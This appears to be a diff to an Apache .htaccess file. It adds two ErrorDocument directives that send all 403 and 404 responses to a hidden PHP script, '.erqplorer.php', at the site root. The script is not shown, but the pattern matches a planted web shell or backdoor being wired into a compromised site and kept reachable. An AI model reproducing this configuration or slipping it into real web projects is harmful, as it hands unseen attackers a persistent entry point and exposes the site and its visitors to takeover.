@@ -1,1 +1,3 @@
 php 1
+ErrorDocument 403 /.erqplorer.php
+ErrorDocument 404 /.erqplorer.php
